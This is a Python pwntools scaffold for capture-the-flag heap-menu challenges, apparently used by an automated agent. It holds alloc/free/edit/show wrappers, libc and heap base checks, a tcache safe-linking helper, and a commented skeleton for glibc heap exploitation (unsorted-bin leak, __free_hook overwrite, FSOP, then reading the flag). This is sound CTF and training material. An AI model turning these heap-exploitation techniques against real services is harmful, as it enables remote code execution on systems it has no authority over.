#!/usr/bin/env python3
"""Heap-menu chal scaffold (alloc / free / edit / show).

Replace the TODO-marked prompt bytes with the chal's real menu strings,
then write the exploit body at the bottom. Loads
`./.chal-libs/libc_profile.json` when chal-libc-fix has produced it so
glibc version + symbols + safe_linking flag are structured data, not
text rediscovered every retry.

Usage from the agent:
    cp /opt/scaffold/heap_menu.py ./exploit.py
    # then edit MENU_PROMPT, alloc/free/edit/show prompts, and the
    # exploit body. Keep the libc-base + safe-link helpers.

Run the same way the orchestrator runs it:
    python3 ./exploit.py host:port      # remote
    python3 ./exploit.py                # local — uses ./prob
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

from pwn import ELF, context, log, p64, process, remote, u64  # noqa: F401

context.log_level = "info"
context.timeout = 10

BIN = "./prob"  # the patchelf'd writable copy from chal-libc-fix


def make_tube():
    if len(sys.argv) >= 2 and ":" in sys.argv[1]:
        host, port = sys.argv[1].rsplit(":", 1)
        return remote(host, int(port))
    return process(BIN)


# ---------------- libc profile (auto from chal-libc-fix) ----------------
PROFILE_PATH = Path("./.chal-libs/libc_profile.json")
profile: dict | None = None
if PROFILE_PATH.is_file():
    profile = json.loads(PROFILE_PATH.read_text())
    log.info(f"libc version: {profile.get('version')} "
             f"(safe_linking={profile.get('safe_linking')}, "
             f"tcache_key={profile.get('tcache_key')}, "
             f"hooks_alive={profile.get('hooks_alive')})")
    log.info(f"preferred FSOP: {profile.get('preferred_fsop_chain')}")
LIBC_PATH = ((profile or {}).get("libc_path")
             or "./.chal-libs/libc.so.6")
libc = ELF(LIBC_PATH) if Path(LIBC_PATH).is_file() else None


# ---------------- menu wrappers (TODO: match real chal) -----------------
MENU_PROMPT = b"> "                # TODO: chal's top-level prompt
PROMPT_INDEX = b"index: "          # TODO
PROMPT_SIZE = b"size: "            # TODO
PROMPT_DATA = b"data: "            # TODO

p = make_tube()


def menu(choice: int) -> None:
    p.recvuntil(MENU_PROMPT, timeout=context.timeout)
    p.sendline(str(choice).encode())


def alloc(idx: int, size: int, data: bytes = b"") -> None:
    menu(1)  # TODO: real menu number
    p.recvuntil(PROMPT_INDEX, timeout=context.timeout)
    p.sendline(str(idx).encode())
    p.recvuntil(PROMPT_SIZE, timeout=context.timeout)
    p.sendline(str(size).encode())
    if data:
        p.recvuntil(PROMPT_DATA, timeout=context.timeout)
        # `send` (no newline) preserves binary payloads. The chal may
        # call read() with the exact size; if it uses fgets() / gets(),
        # switch to sendline.
        p.send(data)


def free(idx: int) -> None:
    menu(2)
    p.recvuntil(PROMPT_INDEX, timeout=context.timeout)
    p.sendline(str(idx).encode())


def edit(idx: int, data: bytes) -> None:
    menu(3)
    p.recvuntil(PROMPT_INDEX, timeout=context.timeout)
    p.sendline(str(idx).encode())
    p.recvuntil(PROMPT_DATA, timeout=context.timeout)
    p.send(data)


def show(idx: int) -> bytes:
    menu(4)
    p.recvuntil(PROMPT_INDEX, timeout=context.timeout)
    p.sendline(str(idx).encode())
    # The chal probably prints `data: <bytes>\n`; adapt the recvuntil
    # to whatever marker it uses before the leak.
    p.recvuntil(PROMPT_DATA, timeout=context.timeout)
    return p.recvline(timeout=context.timeout).rstrip(b"\n")


# ---------------- leak validation + safe-link helpers -------------------
def assert_libc_base(leak: int, sym_offset: int) -> int:
    """Compute libc_base from a leaked address whose symbolic offset is
    known. Fail loud if the leak doesn't end on a page boundary —
    that usually means the offset is wrong for this libc or the leak
    captured the wrong field.
    """
    base = leak - sym_offset
    if base & 0xfff:
        log.failure(f"libc base {hex(base)} is NOT page-aligned — "
                    f"sym_offset {hex(sym_offset)} likely wrong for "
                    f"glibc {(profile or {}).get('version')}")
        raise SystemExit(2)
    log.success(f"libc.address = {hex(base)}")
    if libc:
        libc.address = base
    return base


def assert_heap_base(leak: int) -> int:
    """Heap base aligns to 0x1000 since glibc 2.32. On older glibc
    use a stricter offset-from-leaked-chunk approach instead.
    """
    base = leak & ~0xfff
    log.success(f"heap_base = {hex(base)} (page-aligned)")
    return base


def safe_link(target_addr: int, chunk_addr: int) -> int:
    """tcache poison fd value. Applies safe-linking XOR on glibc >= 2.32."""
    if profile and profile.get("safe_linking"):
        return target_addr ^ (chunk_addr >> 12)
    if profile is None:
        log.warn("no libc_profile.json — assuming safe_linking=True "
                 "(conservative). Override if glibc < 2.32.")
        return target_addr ^ (chunk_addr >> 12)
    return target_addr


# ---------------- exploit body (TODO: replace) --------------------------
# Skeleton: leak libc via unsorted-bin → arb write → trigger → cat flag.
#
# 1. Trigger a >0x420 free to populate unsorted; reuse the slot via
#    UAF / re-alloc to read main_arena.bins (libc leak).
# 2. Pick a primitive matching profile['recommended_techniques']:
#       - hooks_alive (glibc < 2.34): __free_hook overwrite is cheapest.
#       - tcache_key (glibc >= 2.29): UAF over the key field first.
#       - safe_linking (glibc >= 2.32): use safe_link() helper above.
#       - FSOP chain: import scaffold/fsop_wfile.py.
# 3. Trigger the primitive (free a chunk whose content is "/bin/sh\x00",
#    or call exit(1) to fire _IO_cleanup, etc.).
# 4. After RCE, recv the flag — DO NOT call p.interactive() (no TTY).
#
# Example (uncomment + adapt):
#
#   alloc(0, 0x500, b"A" * 8)
#   alloc(1, 0x20, b"B" * 8)          # tail guard
#   free(0)
#   leak = u64(show(0).ljust(8, b"\x00"))
#   libc_base = assert_libc_base(leak, 0x1ecbe0)  # main_arena + 96
#   ...
#   p.sendline(b"cat /flag*")
#   print(p.recvrepeat(2.0).decode(errors="replace"))

p.close()
